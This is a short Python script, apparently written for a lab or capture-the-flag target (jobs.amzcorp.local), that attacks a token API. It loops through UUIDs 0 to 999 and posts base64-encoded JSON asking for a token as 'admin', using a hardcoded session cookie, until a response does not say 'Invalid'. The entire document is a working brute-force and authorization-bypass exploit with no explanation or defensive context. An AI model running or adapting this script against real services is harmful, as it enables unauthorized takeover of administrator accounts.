#!/usr/bin/python3
import requests, base64, sys
from pwn import log

bar = log.progress("uuid")

target = "http://jobs.amzcorp.local/api/v4/tokens/get"

cookies = {"session": ".eJxFjjtuxDAMRO-iOggo8SdvlUtsbehDJkbWXsDeLYIgd4-MFKmImeFg3neYfbfjI1we-9Newrz0cAnYY9Qq5yGWbFnVok5YnRGrlS7SKgFSak279xzZqbBATuAVM0IHz4AluhK0JNKxkcqETp2BvFTIFFlMFCsoCZhAIbFEpWQIA-R52P5HM7EOox27z4_7p23D4km4ghO7alfn5gmzWRWyPnhSo0yp4jR6tpblNipfy_Z-WHs75Wu7ryPa7zcbyXUsHUOei1tZ7f85_PwCu8NT-g.ZdFp7A.L6Iis0pK_hqXPiw978Om3IyMOaY"}  
headers = {"Content-Type": "application/json"}

for uuid in range(0,1000):
    data = '{"get_token": "True", "uuid": "%d", "username": "admin"}' % uuid
    json = {"data": base64.b64encode(data.encode())}

    request = requests.post(target, headers=headers, cookies=cookies, json=json)
    bar.status(uuid)

    if "Invalid" not in request.text:
        print(request.text.strip())
        bar.success(uuid)
        sys.exit(0)